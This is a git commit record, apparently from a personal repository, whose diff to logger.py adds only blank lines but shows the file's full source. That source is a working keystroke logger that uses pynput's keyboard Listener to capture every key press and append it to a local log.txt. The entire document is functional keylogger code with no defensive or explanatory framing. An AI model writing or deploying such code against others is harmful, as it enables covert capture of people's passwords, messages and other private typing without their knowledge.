5aa9602b2784b70e3885e60657f16d0cd7bcfde7
Artem Ugenes PC <elf0@list.ru>
2020-09-29 16:10:00 +0300

    some improvements

--- logger.py
+++ logger.py
@@ -1,10 +1,12 @@
 from pynput.keyboard import Listener
 
+
 def write(key):
     keydata = str(key)
     #keydata.replace("'", " ") '''123```""
     with open("log.txt", "a") as f:
         f.write(keydata)
+
 
 with Listener(on_press=write) as l:
     l.join()
